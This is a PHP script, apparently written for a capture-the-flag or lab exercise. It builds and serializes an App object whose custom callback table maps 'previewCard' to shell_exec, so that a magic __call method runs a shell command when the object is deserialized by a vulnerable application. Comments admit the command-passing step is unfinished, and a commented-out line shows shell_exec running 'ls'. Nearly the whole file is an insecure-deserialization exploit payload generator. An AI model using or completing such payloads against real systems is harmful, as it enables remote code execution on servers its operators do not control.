<?php

// this script is the script to generate the deserialized App class
// When calling $app -> previewCard(), the __call() function will also be called
// unfortunately, I haven't figured out how to pass commands the shell_exec yet
// therefore this demonstration script only works if we manually change $args in __call to some chosen argument array

class App
{
    protected $_request;
    protected $_response;
    protected $_paths = array();
    protected static $_pathLevel = 0;
    protected $_requestMethod;
    protected $_requestPath;
    protected $_currentPath;
    protected $_paramTypes = array();
    protected $_callbacks = array(
        'path' => array(),
        'param' => array(),
        'method' => array(),
        'subdomain' => array(),
        'domain' => array(),
        'format' => array(),
        'custom' => array()
    );

    protected $_helpers = array();
    protected $_responseHandlers = array();

    public function __construct()
    {
        $this->_request = "a";
        $this->_response = "b";
        $this->_paths = ['abc', 'def'];
        $this->_requestMethod = "c";
        $this->_requestPath = 'd';
        $this->_currentPath = 'e';
        $this->_paramTypes = ["abc"];
        $this->_callbacks = [[], [], [], [], [], [], []];
        $this->_callbacks['custom'] = array(
            0 => 'previewCard'
        );
        $this->_callbacks['custom']['previewCard'] = "shell_exec";
        $this->_helpers = [];
        $this->_responseHandlers = [];
    }

    public function __call($method, $args)
    {
        if (isset($this->_callbacks['custom'][$method]) && is_callable($this->_callbacks['custom'][$method])) {
            $callback = $this->_callbacks['custom'][$method];
            // echo $callback;
            return call_user_func_array($callback, $args);
        } else {
            throw new \BadMethodCallException("Method '" . __CLASS__ . "::" . $method . "' not found");
        }
    }
}

$app = new App();
echo $app->previewCard();
// echo call_user_func_array("shell_exec", ['ls']);
echo serialize($app);
